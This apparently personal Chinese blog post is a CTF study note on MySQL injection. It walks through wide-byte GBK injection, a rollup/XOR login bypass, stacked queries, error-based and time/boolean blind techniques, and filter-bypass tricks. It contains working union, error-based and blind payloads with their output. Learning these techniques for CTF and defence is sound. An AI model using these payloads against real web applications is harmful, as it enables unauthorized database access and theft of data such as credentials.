{"title":"","slug":"SQL","date":"2019-07-23T09:32:35.661Z","updated":"2019-07-23T09:46:49.702Z","comments":true,"path":"api/articles/SQL.json","photos":[],"link":"","excerpt":"title: SQL # 标题<br>date: 2019/7/23 17:45:17 # 时间<br>categories: SQL注入# 分类Diary<br>tags: SQL注入# 标签大大小小比赛碰到了好多要不没见过要不不会的注入，这里记录一下吧","covers":null,"content":"<hr>\n<p>title: SQL # 标题<br>date: 2019/7/23 17:45:17 # 时间<br>categories: SQL注入# 分类</p>\n<ul>\n<li>Diary<br>tags: SQL注入# 标签</li>\n</ul>\n<p>大大小小比赛碰到了好多要不没见过要不不会的注入，这里记录一下吧</p>\n<a id=\"more\"></a>\n\n<hr>\n<h2 id=\"宽字节注入\"><a href=\"#宽字节注入\" class=\"headerlink\" title=\"宽字节注入\"></a>宽字节注入</h2><p>GBK是一种多字符的编码，通常来说，一个GBK编码的字符占用两个字节，一个UTF-8的字符占用三个字节。</p>\n<p><strong>转义字符</strong>：为了过滤用户输入数据，对一些特殊字符加上反斜杠”<br>“进行转义，mysql中转义函数有</p>\n<pre><code>addslashes,mysql_real_escape_string,mysql_escape_string等，还有一种是配置magic_quote_gpc,不过高版本已经移除该功能</code></pre><p><strong>宽字节注入</strong>是指mysql数据库在使用GBK编码时会认为两个字符是一个汉子(前一个字符的ascii码要大于128才到汉字范围)，而且当我们引入单引号时，mysql会调用转义函数，将单引号变为&#39;,其中的 \\ 十六进制为%5C,mysql的GBK编码会认为 %df%5C 是一个宽字节，从而使单引号闭合(逃逸)，从而注入攻击。</p>\n<p><strong>sql数据的变化过程</strong></p>\n<pre><code>%df%27--&gt;addslashes()--&gt;%df%5C%27--&gt;GBK--&gt;運&apos;\n\n用户输入--&gt;过滤函数--&gt;代码层$sql--&gt;mysql处理请求--&gt;mysql中的sql</code></pre><p>测试题目是南邮的GBK injection</p>\n<p>测试发现加上单引号没有报错但是有转义操作，在单引号前面插入了反斜杠</p>\n<pre><code>?id=1&apos;        \nyour sql:select id,title from news where id = &apos;1\\&apos;&apos;</code></pre><p>进行宽字节注入</p>\n<pre><code>?id=1%df%27\nyour sql:select id,title from news where id = &apos;1運&apos;&apos;</code></pre><p>如上所述，加入%df之后mysql认为%df%5C是一个汉字，这样单引号就逃逸出来，但是这里还会报错，因为我们人为的闭合了一个单引号之后查询语句长这样</p>\n<pre><code>id=&apos;運&apos;&apos;</code></pre><p>我们还要把最后一个单引号注释掉才行</p>\n<pre><code>?id=1%df%27%23</code></pre><p>注入成功，该查询字段数，查询字段数要用union探测内容，而union得规则是必须列数相同才能正常展示，所以要探测列数，保证构造的查询结果与元数据查询结果的数据结构相同；’order by 1’代表按第一列升序排列，数字代表的列不存在就会报错</p>\n<pre><code>?id=1%df%27 order by 2 %23\nyour sql:select id,title from news where id = &apos;1運&apos; order by 2 #&apos;\nhere is the information</code></pre><p>再探测字段的显示位，即表中数据第几位的字段可以显示。id的值要用-1或者表中没有用过的id值，否则测试值会被覆盖。</p>\n<p>接下来就是常规的注入</p>\n<pre><code>数据库\n?id=-1%df%27 union select 1,group_concat(database()) %23\n表\n?id=-1%df%27 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() %23\n字段\n?id=-1%df%27% union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746634 %23\n因为这对单引号的转义，我们使用十六进制来读取\n信息\n?id=-1%df%27 union select 1,group_concat(flag) from ctf4 %23</code></pre><h2 id=\"ISCC中碰到的group-by…with-rollup\"><a href=\"#ISCC中碰到的group-by…with-rollup\" class=\"headerlink\" title=\"ISCC中碰到的group by…with rollup\"></a>ISCC中碰到的group by…with rollup</h2><p>题目来自ISCC线下赛hint.txt</p>\n<pre><code>$sql=&quot;SELECT pwd FROM user WHERE uname = &apos;{$_POST[&apos;uname&apos;]}&apos;&quot;;\n$query = mysqli_query($con,$sql); \nif (mysqli_num_rows($query) == 1) { \n    $key = mysqli_fetch_array($query);\n    if($key[&apos;pwd&apos;] == $_POST[&apos;pwd&apos;]) {\n        echo &quot;xxxxxxxxx&quot;;\n    }else{\n        echo &quot;你这密码不太对啊&quot;;\n    }\n}else if(mysqli_num_rows($query) == 0){\n    echo &quot;你这密码不太对啊&quot;;\n}\nelse{\n    echo &quot;数据太多了&quot;;\n}</code></pre><p>分析题目可知我们需要post一个uname，进行弱比较相等，使得查询结果为空，然后我们也post一个空值就行了。</p>\n<p>group by 分析</p>\n<pre><code>mysql&gt; select * from member;\n+----+----------+----------------------\n----------------+-------------------+\n| id | username | pw\ns   | email |\n+----+----------+----------------------\n----------------+-------------------+\n|  1 | vince| e10adc3949ba59abbe56e\n| vince@pikachu.com |\n|  2 | allen| e10adc3949ba59abbe56e\n| allen@pikachu.com |\n|  3 | kobe | e10adc3949ba59abbe56e\nkes | kobe@pikachu.com  |\n|  4 | grady| e10adc3949ba59abbe56e\n| grady@pikachu.com |\n|  5 | kevin| e10adc3949ba59abbe56e\nma City Thunder | kevin@pikachu.com |\n|  6 | lucy | e10adc3949ba59abbe56e\n| lucy@pikachu.com  |\n|  7 | lili | e10adc3949ba59abbe56e\n| lili@pikachu.com  |\n+----+----------+----------------------\n----------------+-------------------+\n\nmysql&gt; select username from member where sex=&apos;boy&apos; group by username;\n+----------+\n| username |\n+----------+\n| allen|\n| grady|\n| kevin|\n| kobe |\n| vince|\n+----------+\n5 rows in set (0.00 sec)</code></pre><p>group by 对结果进行分类，而with rollup字句将在查询的结果最后一行添上一行数据，来显示分组统计的基础上再进行数据的汇总，但是这里的汇总不是简单的求和，而是要根据对数据处理采用的函数决定的</p>\n<pre><code>mysql&gt; select username from member where sex=&apos;boy&apos; group by username with rollup;\n+----------+\n| username |\n+----------+\n| allen|\n| grady|\n| kevin|\n| kobe |\n| vince|\n| NULL |\n+----------+\n6 rows in set (0.00 sec)</code></pre><p>对于这个题目，我们需要使得查询的结果不为空。可以使用异或来绕过判断。</p>\n<pre><code> mysql&gt; select 1^1;\n+-----+\n| 1^1 |\n+-----+\n|   0 |\n+-----+\n1 row in set (0.00 sec)\n\nmysql&gt; select &apos;aaa&apos;=1;\n+---------+\n| &apos;aaa&apos;=1 |\n+---------+\n|   0 |\n+---------+\n1 row in set, 1 warning (0.00 sec)\n\nmysql&gt; select &apos;id&apos;=0;\n+--------+\n| &apos;id&apos;=0 |\n+--------+\n|  1 |\n+--------+\n1 row in set, 1 warning (0.00 sec)\n\nmysql&gt; select &apos;id111&apos;=0;\n+-----------+\n| &apos;id111&apos;=0 |\n+-----------+\n| 1 |\n+-----------+\n1 row in set, 1 warning (0.00 sec)\n\n\nuname=&apos;1&apos;^1--&gt;uname=0--&gt;相等\n#异或操作对任一操作数为NULL则返回NULL，对于非NULL得操作数，如果奇数个操作数非零，则值为1，否则为零。</code></pre><p>最后payload为：</p>\n<pre><code>uname=&apos;1&apos;^1 group by pwd with rollup limit 1 offset 1%23&apos;</code></pre><p>稍微解释一下limit offset</p>\n<pre><code>mysql&gt; select * from member limit 3 offset 1;\n+----+----------+----------------------------------+-----+-------------+--------\n---+-------------------+\n| id | username | pw   | sex | phonenum| address\n   | email |\n+----+----------+----------------------------------+-----+-------------+--------\n---+-------------------+\n|  2 | allen| e10adc3949ba59abbe56e057f20f883e | boy | 13676767767 | nba 76\n   | allen@pikachu.com |\n|  3 | kobe | e10adc3949ba59abbe56e057f20f883e | boy | 15988767673 | nba lak\nes | kobe@pikachu.com  |\n|  4 | grady| e10adc3949ba59abbe56e057f20f883e | boy | 13676765545 | nba hs\n   | grady@pikachu.com |\n+----+----------+----------------------------------+-----+-------------+--------\n---+-------------------+\n3 rows in set (0.00 sec)\n\n从第一行开始打印3行数据\n\nmysql&gt; select * from member limit 1,3;\n+----+----------+----------------------------------+-----+-------------+--------\n---+-------------------+\n| id | username | pw   | sex | phonenum| address\n   | email |\n+----+----------+----------------------------------+-----+-------------+--------\n---+-------------------+\n|  2 | allen| e10adc3949ba59abbe56e057f20f883e | boy | 13676767767 | nba 76\n   | allen@pikachu.com |\n|  3 | kobe | e10adc3949ba59abbe56e057f20f883e | boy | 15988767673 | nba lak\nes | kobe@pikachu.com  |\n|  4 | grady| e10adc3949ba59abbe56e057f20f883e | boy | 13676765545 | nba hs\n   | grady@pikachu.com |\n+----+----------+----------------------------------+-----+-------------+--------\n---+-------------------+\n3 rows in set (0.00 sec)\n\n从第一行开始打印三行</code></pre><p>为什么不直接用limit 1，1 呢？</p>\n<h2 id=\"堆叠注入\"><a href=\"#堆叠注入\" class=\"headerlink\" title=\"堆叠注入\"></a>堆叠注入</h2><p>堆叠查询可以执行多条SQL语句，之间用分号’;’隔开.与union select 联合查询不同，堆叠查询可以执行任何语句，而后者只能执行有限的(列数相同)。</p>\n<pre><code>mysql&gt; show tables;\n+----------------+\n| Tables_in_ctf4 |\n+----------------+\n| admin           |\n| news           |\n+----------------+\n2 rows in set (0.00 sec)\n\nmysql&gt; select * from admin;select * from news;\n+-----+-------+----------------------------------+\n| uid | name  | pass                              |\n+-----+-------+----------------------------------+\n|   1 | admin | 21232f297a57a5a743894a0e4a801fc3 |\n+-----+-------+----------------------------------+\n1 row in set (0.04 sec)\n\n+-----+--------+--------------------------+\n| tid | title  | content                    |\n+-----+--------+--------------------------+\n|   1 | heihei | 绂绘垚鍔熷張杩戜簡涓€姝?    |\n|   2 | haha   | 椹笂灏辨垚鍔熶簡          |\n+-----+--------+--------------------------+\n2 rows in set (0.03 sec)</code></pre><p>堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。做过的几道题都是用的MariaDB</p>\n<h2 id=\"报错注入\"><a href=\"#报错注入\" class=\"headerlink\" title=\"报错注入\"></a>报错注入</h2><ul>\n<li>关键函数</li>\n</ul>\n<p>rand() 用于产生一个0~1的随机数</p>\n<p>floor() 向下取整</p>\n<p>rand()函数生成0~1的函数，使用floor()函数向下取整，值是固定的’0’，我们将rand*2，得到的值就是不固定的0或者1。</p>\n<p>这里为什么不能直接用一个固定的常量比如1,0？而必须使用随机函数？因为我们需要使用函数在调用时会被执行的特点。</p>\n<p>这是一句简单的查询语句</p>\n<pre><code>select floor(rand(0)*2) from information_schema.tables;</code></pre><p>加上随机种子后是一个伪随机序列。同时这个报错也与数据量有关，这个我们下文会分析</p>\n<p>伪随机的序列前几位是</p>\n<pre><code>+------------------+\n| floor(rand(0)*2) |\n+------------------+\n|                0 |\n|                1 |\n|                1 |\n|                0 |\n|                1 |\n|                1 |\n|                0 |\n|                0 |\n|                1 |\n|                1 |\n|                1 |\n|                0 |\n|                1 |\n|                1 |</code></pre><p>我们使用count()和group by 来对结果进行统计，这里不加种子。</p>\n<pre><code>select count(*) from information_schema.tables group by floor(rand()*2);\n\n+----------+\n| count(*) |\n+----------+\n|       47 |\n|       50 |\n+----------+</code></pre><p>经过测试发现不加种子也有出现报错的几率，但是我们加上种子之后必然会报错。在了解原因之前我们还要再了解一下count()函数</p>\n<ul>\n<li>count()</li>\n</ul>\n<p>在进行count时对查到的数据会创建一个虚拟表用来保存结果。如果key的结果在虚拟表中已经存在则count的结果加一，否则就插入新纪录。</p>\n<p>由上文可知，floor(rand(0)*2)的结果是固定的’011011’，所以报错的原因应该是floor(rand(0)*2)的多次计算导致的。</p>\n<pre><code>floor(rand(0*2)        011011\n0            查到0，虚拟表中不存在，执行插入\n1            插入insert floor(rand(0)*2) into tablename;插入时再次调用函数也就是说插入的是1\n1            表中存在,count+1\n0            查到0，不存在，进行插入\n1            插入insert floor(rand(0)*2) into tablename;插入时再次调用函数也就是说插入的是1\n1            报错\n\nkey            count\n1            1+1\n1            报错</code></pre><p>从这里我们可以看到存在两个相同的key，主键唯一的，所以报错。表里有大于等于三条数据时就会报错。</p>\n<p>那前面说的不加种子也有几率报错是为什么？</p>\n<p>其实只要满足下面的条件就可以报错</p>\n<pre><code>查询              虚拟表插入\n第一次计算         第二次计算\n第三次计算         第四次计算</code></pre><p>只要第三次结果与第二第四都不同，同时第二第四计算相同即可</p>\n<p>我们构造下面的语句</p>\n<pre><code>select count(*),concat(user(),floor(rand(0)*2)) x from information_schema.tables group by x;\n\nERROR 1062 (23000): Duplicate entry &apos;root@localhost1&apos; for key &apos;group_key&apos;</code></pre><p>成功返回信息</p>\n<p>如果不携带uesr()，报的是11，也就是说是concat()函数部分执行了语句</p>\n<pre><code>select count(*) from information_schema.tables group by concat(1,floor(rand(0)*2));\n\nERROR 1062 (23000): Duplicate entry &apos;11&apos; for key &apos;group_key&apos;</code></pre><ul>\n<li>其他函数</li>\n</ul>\n<p>updataxml()</p>\n<pre><code>select * from user where username = &apos;admin&apos; or updatexml(1,concat(0x7e,(database())),0);\n\nERROR 1105 (HY000): XPATH syntax error: &apos;~test1&apos;</code></pre><p>因为第二个参数需要Xpath格式，输入不符合就报错，最大长度为32位,extractvalue()也是如此</p>\n<p>extractvalue()</p>\n<pre><code>select * from user where username = &apos;admin&apos; and extractvalue(1,concat(0x7e,(select database())))\n\nERROR 1105 (HY000): XPATH syntax error: &apos;~test1&apos;</code></pre><h2 id=\"盲注\"><a href=\"#盲注\" class=\"headerlink\" title=\"盲注\"></a>盲注</h2><p>主要两种，即 <strong>时间盲注</strong> ， <strong>布尔盲注</strong></p>\n<h3 id=\"时间盲注\"><a href=\"#时间盲注\" class=\"headerlink\" title=\"时间盲注\"></a>时间盲注</h3><h4 id=\"函数\"><a href=\"#函数\" class=\"headerlink\" title=\"函数\"></a>函数</h4><p>sleep() 睡眠时间为参数设定的秒数，然后返回0。若sleep()被中断，返回1。<br>假如这里我们有一张表</p>\n<pre><code>mysql&gt; select * from user;\n+----+--------------------------------+----------+\n| id | username                       | password |\n+----+--------------------------------+----------+\n|  1 | admin                          | 1234567  |\n|  2 | 012345678901234567890123456789 | 1234567  |\n|  3 | 012345678901234567890123456789 | 1234567  |\n|  4 | admin                          | 11111    |\n|  5 | admin                          | 222222   |\n|  6 | admin                          | 33333    |\n+----+--------------------------------+----------+\n6 rows in set (0.00 sec)</code></pre><p>我们尝试查询一条数据并设置时间为3s</p>\n<pre><code>select * from user where id = 1 and sleep(3);\nEmpty set (3.00 sec)</code></pre><p>可以看到成功延时了3s.如果我们查一条表里不存在的数据，则会直接返回，不执行sleep()。</p>\n<pre><code>select * from user where id = 9999 and sleep(3);\nEmpty set (0.00 sec)</code></pre><p>and前面的条件为假，后面的就不再看了。同样的我们测试or</p>\n<pre><code>select * from user where id = 1 or sleep(3);\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | admin    | 1234567  |\n+----+----------+----------+\n1 row in set (15.01 sec)</code></pre><p>发现时间为15s,我们可以想想表里一共有6条数据，查到第一条数据时id=1为真，此时or后面的表达式不再起作用，剩下的五条数据都为假，执行5次sleep(3),因此时间为15s。</p>\n<h4 id=\"配合if条件触发\"><a href=\"#配合if条件触发\" class=\"headerlink\" title=\"配合if条件触发\"></a>配合if条件触发</h4><p>if(expr1,expr2,expr3)<br>如果expr1是TRUE(expr1&lt;&gt;0 and expr1&lt;&gt; NULL),则IF()的返回值为expr2；否则返回值是expr3。IF()的返回值为数字或则字符串具体情况视其所在语境而定。</p>\n<p>疑问 </p>\n<pre><code>mysql&gt; select * from user where id = 7 or if(1,1,0);\n+----+--------------------------------+----------+\n| id | username                       | password |\n+----+--------------------------------+----------+\n|  1 | admin                          | 1234567  |\n|  2 | 012345678901234567890123456789 | 1234567  |\n|  3 | 012345678901234567890123456789 | 1234567  |\n|  4 | admin                          | 11111    |\n|  5 | admin                          | 222222   |\n|  6 | admin                          | 33333    |\n+----+--------------------------------+----------+\n6 rows in set (0.00 sec)\n\nmysql&gt; select * from user where id = 1 or if(1,1,0);\n+----+--------------------------------+----------+\n| id | username                       | password |\n+----+--------------------------------+----------+\n|  1 | admin                          | 1234567  |\n|  2 | 012345678901234567890123456789 | 1234567  |\n|  3 | 012345678901234567890123456789 | 1234567  |\n|  4 | admin                          | 11111    |\n|  5 | admin                          | 222222   |\n|  6 | admin                          | 33333    |\n+----+--------------------------------+----------+\n6 rows in set (0.00 sec)</code></pre><p>在不知道字段值的情况下可以通过此种方法得到内容</p>\n<pre><code>mysql&gt; select * from user where username = &apos;&apos; or if(1,1,0);\n+----+--------------------------------+----------+\n| id | username                       | password |\n+----+--------------------------------+----------+\n|  1 | admin                          | 1234567  |\n|  2 | 012345678901234567890123456789 | 1234567  |\n|  3 | 012345678901234567890123456789 | 1234567  |\n|  4 | admin                          | 11111    |\n|  5 | admin                          | 222222   |\n|  6 | admin                          | 33333    |\n+----+--------------------------------+----------+\n6 rows in set (0.00 sec)</code></pre><h5 id=\"字符串截取函数\"><a href=\"#字符串截取函数\" class=\"headerlink\" title=\"字符串截取函数\"></a>字符串截取函数</h5><p>substr(str,postion,lines) 从str的第postion个字符开始截取lines长度的字符。</p>\n<p>substring(str,FROM pos FOR len),这里可以不使用逗号。这两个函数如果我们不指定长度就会返回从查到的第一个字符开始的剩下所有字符。</p>\n<p>substring_index(str,关键字，关键字出现次数)。返回str满足出现次数的之前的字符(如果第三个参数是负数则倒着来)</p>\n<pre><code>mysql&gt; select * from user where username = &apos;&apos; or if(substr((select username from user where id=1),1,1)=&apos;a&apos;,sleep(2),0);\nEmpty set (12.00 sec)</code></pre><p>如果id=1的这条数据第一个字符为’a’，则sleep2s.</p>\n<pre><code>select * from user where id = 1 and if(ascii(substr(database(),1,1))=116,sleep(2),null);\nEmpty set (2.00 sec)</code></pre><p>逐字符查询数据库名。</p>\n<h4 id=\"配合-case-when…then…else…end-触发\"><a href=\"#配合-case-when…then…else…end-触发\" class=\"headerlink\" title=\"配合 case when…then…else…end 触发\"></a>配合 case when…then…else…end 触发</h4><pre><code> select case when username = &apos;admin&apos; then &apos;admin&apos; else &apos;xxx&apos; end from user;\n+----------------------------------------------------------+\n| case when username = &apos;admin&apos; then &apos;admin&apos; else &apos;xxx&apos; end |\n+----------------------------------------------------------+\n| admin                                                    |\n| xxx                                                      |\n| xxx                                                      |\n| admin                                                    |\n| admin                                                    |\n| admin                                                    |\n+----------------------------------------------------------+\n6 rows in set (0.00 sec)</code></pre><h3 id=\"除了sleep之外的函数\"><a href=\"#除了sleep之外的函数\" class=\"headerlink\" title=\"除了sleep之外的函数\"></a>除了sleep之外的函数</h3><h4 id=\"BENCHMARK-count-expr\"><a href=\"#BENCHMARK-count-expr\" class=\"headerlink\" title=\"BENCHMARK(count,expr)\"></a>BENCHMARK(count,expr)</h4><p>BENCHMARK()函数重复count次执行expr。它可以被用于计算MYSQL处理表达式的速度。结果值通常为0。</p>\n<pre><code>select benchmark(10000000,sha(1));</code></pre><p>我们结合上面的语句</p>\n<pre><code>select * from user where id = 1 and if(ascii(substr(database(),1,1))=116,benchmark(10000000,sha(1)),null);</code></pre><h4 id=\"笛卡尔积\"><a href=\"#笛卡尔积\" class=\"headerlink\" title=\"笛卡尔积\"></a>笛卡尔积</h4><pre><code>select count(*) from information_schema.tables A,information_schema.tables B,information_schema.tables C;</code></pre><p>通过计算来延时</p>\n<pre><code>mysql&gt; select count(*) from user;\n+----------+\n| count(*) |\n+----------+\n|        6 |\n+----------+\n1 row in set (0.00 sec)\n\nmysql&gt; select count(*) from user A,user B;\n+----------+\n| count(*) |\n+----------+\n       36 |\n+----------+\n1 row in set (0.00 sec)\n\nmysql&gt; select count(*) from user A,user B,user C;\n+----------+\n| count(*) |\n+----------+\n|      216 |\n+----------+\n1 row in set (0.00 sec)\n\n例如：\nselect * from user where id = 1 and if(ascii(substr(database(),1,1))=116,(select count(*) from information_schema.tables A,information_schema.tables B,information_schema.columns C),null);</code></pre><h4 id=\"GET-LOCK\"><a href=\"#GET-LOCK\" class=\"headerlink\" title=\"GET_LOCK\"></a>GET_LOCK</h4><p>GET_LOCK(str,timeout)</p>\n<p>设法使字符串str给定的名字得到一个锁，超时为timeout秒.</p>\n<p>select GET_LOCK(‘a’,1)</p>\n<p>但是上锁后必须在使用长连接能开启两个会话的时候才起作用。</p>\n<h4 id=\"RLIKE\"><a href=\"#RLIKE\" class=\"headerlink\" title=\"RLIKE\"></a>RLIKE</h4><p>通过rpad或repeat 构造长字符串，加以计算量大的pattern，通过repeat的参数控制延时长短。</p>\n<p>   <code>select concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;;</code></p>\n<h3 id=\"布尔盲注\"><a href=\"#布尔盲注\" class=\"headerlink\" title=\"布尔盲注\"></a>布尔盲注</h3><h3 id=\"函数-1\"><a href=\"#函数-1\" class=\"headerlink\" title=\"函数\"></a>函数</h3><p>截取函数</p>\n<pre><code>mid(column_name,start[,length])\nmysql&gt; select mid(&apos;abc&apos;,1,1);\n+----------------+\n| mid(&apos;abc&apos;,1,1) |\n+----------------+\n| a              |\n+----------------+\n1 row in set (0.00 sec)\n\n\nleft(str,lengt) 从左开始截取字符串\nright(str,length) 从右截取 \nmysql&gt; select right(&apos;abcda&apos;,3);\n+------------------+\n| right(&apos;abcda&apos;,3) |\n+------------------+\n| cda              |\n+------------------+\n1 row in set (0.00 sec)\n\n转ascii类型\nascii(str)/ord(str)  返回字符串首字母的ascii值</code></pre><p>布尔盲注与时间盲注差别不大</p>\n<p>常用payload </p>\n<pre><code>ascii(substr((select password from user) from 1 for 1))&lt;127</code></pre><h2 id=\"Bypass\"><a href=\"#Bypass\" class=\"headerlink\" title=\"Bypass\"></a>Bypass</h2><ul>\n<li>空格: /**/</li>\n<li>‘ ASCII码</li>\n<li>union select：堆叠注入</li>\n<li>注释符过滤 让最后查询语句最后一个字符为数字即<code>id=1&#39; or &#39;1</code></li>\n<li>and or ^ | &amp; 相互转换</li>\n<li>‘,’：offset limit、substr()用from 1 for 1 绕过</li>\n<li>！= 用&lt;&gt; 、 =用like,regexp、rlike、in</li>\n<li>获取当前数据库  1’ adn asdf();</li>\n</ul>\n","categories":[],"tags":[]}